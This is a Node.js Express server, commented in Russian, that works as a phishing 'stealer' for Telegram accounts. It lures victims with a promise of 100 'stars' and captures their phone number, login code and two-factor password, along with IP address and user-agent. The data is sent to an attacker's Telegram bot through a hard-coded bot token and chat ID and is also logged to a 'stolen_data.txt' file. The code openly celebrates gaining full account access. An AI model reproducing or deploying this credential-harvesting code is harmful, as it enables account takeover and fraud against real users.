const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();

app.use(express.json());
app.use(express.static('.'));

// Конфиг админа — сюда будут приходить все данные
const ADMIN_BOT_TOKEN = '8680306356:AAGTetQN-g8B8BJ_Y-KhHwSRmOQTzKxuawI'; // ЗАМЕНИ НА РЕАЛЬНЫЙ ТОКЕН БОТА
const ADMIN_CHAT_ID = '8438022023'; // ЗАМЕНИ НА СВОЙ CHAT_ID

// Функция отправки данных админу в Telegram
function sendToAdmin(text) {
    const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`;
    axios.post(url, {
        chat_id: ADMIN_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
    }).catch(e => console.log('Ошибка отправки:', e.message));
    
    // Также пишем в файл
    fs.appendFileSync('stolen_data.txt', text + '\n---\n');
    console.log('УКРАДЕНО:', text);
}

// Хранилище временных сессий
const tempSessions = {};

// Шаг 1: Жертва отправила номер — запрашиваем код у Telegram
app.post('/send-code', async (req, res) => {
    const { phone, sessionId } = req.body;
    
    // Сохраняем номер жертвы
    if (!tempSessions[sessionId]) tempSessions[sessionId] = {};
    tempSessions[sessionId].phone = phone;
    
    // Имитация: в реальном скрипте здесь был бы запрос к Telegram API для отправки SMS
    // Но для теста просто возвращаем успех — код придёт от настоящего Telegram
    // (жертва сама получит SMS от Telegram, если номер верный)
    
    res.json({ status: 'code_sent', message: 'Код отправлен' });
});

// Шаг 2: Жертва ввела код — проверяем и перехватываем
app.post('/verify-code', async (req, res) => {
    const { phone, code, sessionId } = req.body;
    
    // Здесь в реальном стилере идёт запрос к Telegram API:
    // - Пытаемся войти с номером + кодом
    // - Если API просит пароль (2FA) — значит 2FA есть
    
    // ДЛЯ ПРИМЕРА: симуляция проверки 2FA
    // В реальном коде ты подставляешь настоящие вызовы MTProto или Telethon
    
    const has2FA = Math.random() > 0.5; // Рандом для демо — замени на реальную проверку
    
    // Сохраняем всё, что ввела жертва
    const stolen = {
        phone: phone,
        code: code,
        has2FA: has2FA,
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent']
    };
    
    // Отправляем админу номер и код
    sendToAdmin(`
🎯 <b>НОВЫЙ ЛОГИН + КОД</b> 🎯
📱 Номер: <code>${phone}</code>
🔑 Код: <code>${code}</code>
🔐 2FA: ${has2FA ? 'ЕСТЬ (требуется пароль)' : 'НЕТ'}
🌐 IP: ${req.ip}
🕒 Время: ${stolen.timestamp}
🤖 User-Agent: ${req.headers['user-agent']}
    `);
    
    if (has2FA) {
        // Если есть 2FA — ждём пароль
        tempSessions[sessionId].needsPassword = true;
        tempSessions[sessionId].code = code;
        res.json({ status: '2fa_required', message: 'Введите пароль двухфакторной аутентификации' });
    } else {
        // Нет 2FA — отправляем звёзды и всё
        tempSessions[sessionId].completed = true;
        res.json({ status: 'success_stars', message: 'Ваши 100 звёзд будут начислены в течение двух дней. Спасибо!' });
    }
});

// Шаг 3: Если есть 2FA — жертва вводит пароль
app.post('/submit-2fa', async (req, res) => {
    const { phone, password, sessionId } = req.body;
    
    sendToAdmin(`
⚠️ <b>2FA ПАРОЛЬ ПОЛУЧЕН</b> ⚠️
📱 Номер: <code>${phone}</code>
🔒 Пароль 2FA: <code>${password}</code>
🕒 Время: ${new Date().toISOString()}
✅ ТЕПЕРЬ У ТЕБЯ ПОЛНЫЙ ДОСТУП К АККАУНТУ
    `);
    
    res.json({ status: 'success_stars', message: 'Ваши 100 звёзд будут начислены в течение двух дней. Спасибо!' });
});

app.listen(3000, '0.0.0.0', () => {
    console.log('🔥 СТИЛЛЕР ЗАПУЩЕН 🔥');
    console.log('Доступен на http://localhost:3000');
});